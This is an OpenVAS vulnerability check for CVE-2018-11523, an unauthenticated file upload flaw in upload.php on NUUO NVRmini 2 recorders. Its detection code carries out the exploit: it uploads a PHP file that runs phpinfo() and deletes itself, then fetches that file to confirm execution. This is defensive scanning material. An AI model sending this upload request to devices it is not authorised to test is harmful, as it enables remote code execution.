###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nuuo_nvrmini2_file_upload_vuln.nasl 10387 2018-07-04 05:21:03Z cfischer $
#
# NUUO NVRmini 2 File Upload Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:nuuo:nuuo";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141124");
  script_version("$Revision: 10387 $");
  script_tag(name: "last_modification", value: "$Date: 2018-07-04 07:21:03 +0200 (Wed, 04 Jul 2018) $");
  script_tag(name: "creation_date", value: "2018-05-30 13:34:16 +0700 (Wed, 30 May 2018)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2018-11523");

  script_tag(name: "qod_type", value: "exploit");

  script_tag(name: "solution_type", value: "NoneAvailable");

  script_name("NUUO NVRmini 2 File Upload Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_nuuo_devices_web_detect.nasl");
  script_mandatory_keys("nuuo/web/detected");

  script_tag(name: "summary", value: "upload.php on NUUO NVRmini 2 devices allows Arbitrary File Upload, such as
upload of .php files.");

  script_tag(name: "vuldetect", value: "Tries to upload a PHP file and checks if phpinfo() can be exectuted.");

  script_tag(name: "solution", value: "No known solution is available as of 30th May, 2018. Information regarding
this issue will be updated once solution details are available.");

  script_xref(name: "URL", value: "https://www.exploit-db.com/exploits/44794/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

file = 'OpenVAS_' + rand() + '.php';

bound = '---------------------------OpenVAS_' + rand();

data = '--' + bound + '\r\n' +
       'Content-Disposition: form-data; name="userfile"; filename="' + file + '"\r\n\r\n' +
       '<?php phpinfo(); unlink(__FILE__); ?>\r\n' +
       '--' + bound + '--\r\n';

req = http_post_req(port: port, url: '/upload.php', data: data,
                    add_headers: make_array("Content-Type", "multipart/form-data; boundary=" + bound));
res = http_keepalive_send_recv(port: port, data: req);

url = '/' + file;

if (http_vuln_check(port: port, url: url, pattern: "PHP Version", check_header: TRUE, extra_check: "PHP API")) {
  report = "It was possible to upload a PHP file and execute phpinfo().";
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
